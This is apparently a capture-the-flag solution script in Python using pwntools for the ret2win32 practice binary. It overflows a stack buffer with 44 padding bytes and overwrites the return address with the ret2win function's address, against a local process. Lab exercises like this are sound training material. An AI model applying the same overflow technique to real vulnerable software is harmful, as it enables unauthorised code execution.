#!/usr/bin/python

import os
from pwn import *

e = ELF('./ret2win32')
r = process(e.path)
payload = 'A' * 44	# offset
payload += p32(e.symbols['ret2win'])

r.recvuntil('>')
r.sendline(payload)
r.interactive()
